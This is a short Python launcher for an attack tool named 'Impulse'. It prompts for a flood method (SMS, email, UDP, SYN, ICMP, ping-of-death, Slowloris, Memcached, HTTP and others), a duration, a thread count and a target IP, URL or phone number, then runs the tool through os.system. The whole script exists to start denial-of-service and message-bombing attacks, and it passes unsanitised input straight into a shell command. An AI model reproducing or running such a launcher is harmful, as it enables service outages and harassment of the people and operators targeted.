import os
import colorama
import time
from colorama import init
# from keyboard import press_and_release
from time import sleep
from colorama import Fore, Back, Style
init()
# Fore: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
# Back: BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE, RESET.
# Style: DIM, NORMAL, BRIGHT, RESET_ALL
print(Fore. GREEN)
print("Start Impulse Script")
print(Fore.YELLOW)
method = input("Method <SMS/EMAIL/NTP/UDP/SYN/ICMP/POD/SLOWLORIS/MEMCACHED/HTTP>: ")
time = input("Time <time in secounds>: ")
threads = input("Threads <threads count (1-200)>: ")
target = input("Target <IP:PORT, URL, PHONE с +373>: ")
os.system(f"python3 Impulse/impulse.py —method {method} —time {time} —threads {threads} —target {target} ")
